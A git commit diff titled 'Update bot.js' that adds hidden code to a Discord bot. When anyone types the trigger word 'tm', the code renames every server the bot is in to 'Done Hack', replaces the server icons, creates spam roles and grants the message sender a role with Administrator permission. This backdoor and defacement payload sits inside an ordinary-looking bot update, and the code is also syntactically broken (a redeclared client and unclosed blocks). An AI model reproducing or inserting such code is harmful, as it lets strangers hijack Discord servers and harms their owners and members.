377210350db6ea0d27e38864190eeb37d1f03225
FireClanProgramer <42547710+FireClanProgramer@users.noreply.github.com>
2018-08-20 18:10:20 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -27,5 +27,144 @@ client.user.setGame(`Nothing`,"http://twitch.tv/S-F")
   console.log('')
   console.log('')
 });
+const Discord = require("discord.js");
+const client = new Discord.Client();
 
+
+
+
+
+
+
+
+var x_x = "tm" 
+
+
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setUsername("Done Hack")
+
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setGame(`Done Hack`, 'https://www.twitch.tv/hix')
+
+ }
+});
+
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.guilds.forEach(m => {
+   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+  })
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.guilds.forEach(m => {
+   m.setName(`Done Hack`)
+  })
+ }
+});
+
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+
+  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+
+ }
+});
+
+
+
+
+
+
+client.on('message', message => {
+ if (!message.channel.guild) return;
+  if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [8],
+   color: "#23272a"
+  }).then(function(role) {
+   message.member.addRole(role);
+  })
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1], 
+   color: "#ff0000"
+  });
+  message.guild.createRole({
+   name: "FireCommunity",
+   permissions: [1], 
+   color: "#ff0000"
+});
+  message.guild.createRole({
+   name: "FireCommunity",
+   permissions: [1], 
+   color: "#ff0000"
+});
+  message.guild.createRole({
+   name: "FireCommunity",
+   permissions: [1], 
+   color: "#ff0000"
 client.login(process.env.BOT_TOKEN);
